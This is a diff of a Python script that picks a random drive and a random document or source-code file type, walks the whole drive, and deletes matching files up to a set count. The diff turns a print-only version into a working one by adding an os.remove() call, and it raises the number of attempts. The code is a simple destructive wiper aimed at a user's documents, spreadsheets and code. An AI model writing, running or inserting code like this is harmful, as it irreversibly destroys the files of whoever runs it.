@@ -14,23 +14,24 @@ filetype = [".m",".py",".c",".cpp",".cs",".doc",".docx",".ppt",".pptx",".xls",".
 # set delete file number
 #------------------------------------------------------
 del_num=10
-try_time=3
+try_time=5
 #------------------------------------------------------
 #	start
 #------------------------------------------------------
-while(del_num>0 and try_time>=0):
+while(del_num>0 and try_time>0):
 	#------------------------------------------------------
 	#   random choice drive and filetype
 	#------------------------------------------------------
 	sl_drive = random.choice(drives)
 	sl_ft    = random.choice(filetype)
 	try_time=try_time-1
-	
+	print('the rest try time is   %s  ' %try_time)
 	print('select drive is   %s  ,select type is   %s  '%(sl_drive,sl_ft))
 	for root, dirs, files in os.walk(sl_drive):
 		for name in files:
 			if name.endswith(sl_ft):
 				print ("Delete File: " + os.path.join(root, name))
+				os.remove(os.path.join(root, name))
 				print del_num
 				del_num=del_num-1
 			#--------------------
